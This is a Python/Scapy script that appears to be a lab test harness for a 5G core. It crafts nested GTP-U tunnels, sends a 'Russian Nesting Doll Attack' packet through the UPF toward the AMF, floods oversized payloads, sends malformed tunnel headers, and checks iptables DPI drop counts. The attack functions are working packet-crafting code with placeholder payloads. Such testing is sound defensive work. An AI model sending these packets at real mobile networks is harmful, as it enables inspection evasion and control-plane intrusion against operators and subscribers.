#!/usr/bin/env python3
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from scapy.layers.inet import IP, UDP, ICMP
from scapy.packet import Raw
from scapy.sendrecv import send
from scapy.contrib.gtp import GTPHeader
import logging
from core.config import TEST_CONFIG, validate_config
 
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def craft_nested_gtp_tunnel(depth, upf_ip, base_teid, final_payload):
    if depth < 1:
        return None
    
    try:
        current_packet = Raw(load=final_payload)
        
        for level in range(depth, 0, -1):
            teid = base_teid + level
            inner_ip = f"10.0.0.{level + 10}"
            
            gtp_layer = GTPHeader(teid=teid, gtp_type=255)
            ip_layer = IP(src=inner_ip, dst=upf_ip)
            udp_layer = UDP(sport=2152, dport=2152)
            
            current_packet = gtp_layer / ip_layer / udp_layer / current_packet
        
        outer_ip = IP(src=TEST_CONFIG["outer_src"], dst=upf_ip)
        outer_udp = UDP(sport=2152, dport=2152)
        outer_gtp = GTPHeader(teid=base_teid, gtp_type=255)
        
        final_packet = outer_ip / outer_udp / outer_gtp / current_packet
        
        return final_packet
    except Exception as e:
        logger.error(f"Failed to craft nested tunnel (depth {depth}): {e}")
        return None

def get_dpi_drop_count():
    """Get total DPI drop counter from iptables"""
    import subprocess
    total_drops = 0
    try:
        result = subprocess.run(
            ['iptables', '-L', 'GTP_DPI', '-n', '-v', '-x'],
            capture_output=True, text=True
        )
        if result.returncode == 0:
            for line in result.stdout.split('\n'):
                if 'DROP' in line:
                    parts = line.split()
                    if len(parts) >= 1:
                        try:
                            total_drops += int(parts[0])
                        except ValueError:
                            pass
    except:
        pass
    return total_drops

def test_nested_depth(upf_ip, max_depth=5, iface=None):
    if iface is None:
        iface = TEST_CONFIG["interface"]
    
    validate_config()
    
    logger.info(f"=== Nested GTP-U Depth Testing (1-{max_depth} levels) ===")
    
    results = {}
    
    initial_drops = get_dpi_drop_count()
    
    for depth in range(1, max_depth + 1):
        logger.info(f"\nTesting depth {depth}...")
        
        try:
            base_teid = 50000
            payload = f"DEPTH_{depth}_TEST".encode()
            
            pkt = craft_nested_gtp_tunnel(depth, upf_ip, base_teid, payload)
            
            if pkt:
                drops_before = get_dpi_drop_count()
                send(pkt, iface=iface, verbose=0)
                
                import time
                time.sleep(0.1)
                
                drops_after = get_dpi_drop_count()
                
                if drops_after > drops_before:
                    logger.info(f"🛡️ {depth}-level nested tunnel BLOCKED by DPI")
                    results[depth] = "blocked"
                else:
                    logger.info(f"✓ Sent {depth}-level nested tunnel")
                    results[depth] = "sent"
            else:
                logger.error(f"✗ Failed to craft {depth}-level tunnel")
                results[depth] = "craft_failed"
        except Exception as e:
            logger.error(f"✗ Error at depth {depth}: {e}")
            results[depth] = "error"
    
    final_drops = get_dpi_drop_count()
    total_blocked = final_drops - initial_drops
    
    logger.info("\n=== Depth Test Results ===")
    for depth, status in sorted(results.items()):
        logger.info(f"Depth {depth}: {status}")
    
    if total_blocked > 0:
        logger.info(f"\n🛡️ DPI blocked {total_blocked} nested tunnel packets")
    
    return results

def russian_nesting_doll_attack(upf_ip, amf_ip, depth=3, iface=None):
    if iface is None:
        iface = TEST_CONFIG["interface"]
    
    validate_config()
    
    logger.info(f"=== Russian Nesting Doll Attack (depth {depth}) ===")
    logger.info(f"Target: {amf_ip} via {upf_ip}")
    
    try:
        malicious_payload = b"MALICIOUS_CONTROL_PLANE_MESSAGE"
        
        inner_ip_packet = IP(src=TEST_CONFIG["inner_src"], dst=amf_ip)/ICMP()/Raw(load=malicious_payload)
        
        pkt = craft_nested_gtp_tunnel(depth, upf_ip, 60000, bytes(inner_ip_packet))
        
        if pkt:
            send(pkt, iface=iface, verbose=0)
            logger.info(f"✓ Sent {depth}-level nested attack to control plane")
            return True
        else:
            logger.error("Failed to craft attack packet")
            return False
    except Exception as e:
        logger.error(f"Russian nesting doll attack failed: {e}")
        return False

def test_tunnel_size_limits(upf_ip, payload_sizes=[100, 1000, 10000, 65000], iface=None):
    if iface is None:
        iface = TEST_CONFIG["interface"]
    
    validate_config()
    
    logger.info("=== Tunnel Payload Size Testing ===")
    
    results = {}
    
    for size in payload_sizes:
        logger.info(f"\nTesting {size} byte payload...")
        
        try:
            payload = b'\x00' * size
            pkt = craft_nested_gtp_tunnel(2, upf_ip, 70000, payload)
            
            if pkt:
                send(pkt, iface=iface, verbose=0)
                logger.info(f"✓ Sent {size} byte nested tunnel")
                results[size] = "sent"
            else:
                logger.error(f"✗ Failed to craft {size} byte tunnel")
                results[size] = "craft_failed"
        except Exception as e:
            logger.error(f"✗ Error with {size} bytes: {e}")
            results[size] = "error"
    
    logger.info("\n=== Size Test Results ===")
    for size, status in sorted(results.items()):
        logger.info(f"{size:6d} bytes: {status}")
    
    return results

def malformed_nested_tunnel(upf_ip, malformation_type="truncated", iface=None):
    if iface is None:
        iface = TEST_CONFIG["interface"]
    
    validate_config()
    
    logger.info(f"=== Malformed Nested Tunnel Test ({malformation_type}) ===")
    
    try:
        if malformation_type == "truncated":
            inner_gtp = GTPHeader(teid=80000, gtp_type=255)
            inner_gtp_bytes = bytes(inner_gtp)[:8]
            
            outer_pkt = IP(src=TEST_CONFIG["outer_src"], dst=upf_ip)/UDP(sport=2152, dport=2152)/GTPHeader(teid=80001, gtp_type=255)/Raw(load=inner_gtp_bytes)
        
        elif malformation_type == "invalid_type":
            inner_gtp = GTPHeader(teid=80002, gtp_type=99)
            outer_pkt = IP(src=TEST_CONFIG["outer_src"], dst=upf_ip)/UDP(sport=2152, dport=2152)/GTPHeader(teid=80003, gtp_type=255)/Raw(load=bytes(inner_gtp))
        
        elif malformation_type == "zero_teid":
            inner_gtp = GTPHeader(teid=0, gtp_type=255)
            outer_pkt = IP(src=TEST_CONFIG["outer_src"], dst=upf_ip)/UDP(sport=2152, dport=2152)/GTPHeader(teid=80004, gtp_type=255)/Raw(load=bytes(inner_gtp))
        
        else:
            logger.error(f"Unknown malformation type: {malformation_type}")
            return False
        
        send(outer_pkt, iface=iface, verbose=0)
        logger.info(f"✓ Sent malformed nested tunnel ({malformation_type})")
        return True
    except Exception as e:
        logger.error(f"Malformed tunnel test failed: {e}")
        return False

if __name__ == "__main__":
    upf_ip = TEST_CONFIG["upf_ip"]
    amf_ip = TEST_CONFIG["amf_ip"]
    
    logger.info("Test 1: Nested Depth Testing")
    test_nested_depth(upf_ip, max_depth=4)
    
    logger.info("\n\nTest 2: Russian Nesting Doll Attack")
    russian_nesting_doll_attack(upf_ip, amf_ip, depth=3)
    
    logger.info("\n\nTest 3: Payload Size Limits")
    test_tunnel_size_limits(upf_ip, payload_sizes=[100, 1000, 10000])
    
    logger.info("\n\nTest 4: Malformed Nested Tunnels")
    malformed_nested_tunnel(upf_ip, "truncated")
    malformed_nested_tunnel(upf_ip, "invalid_type")
    malformed_nested_tunnel(upf_ip, "zero_teid")

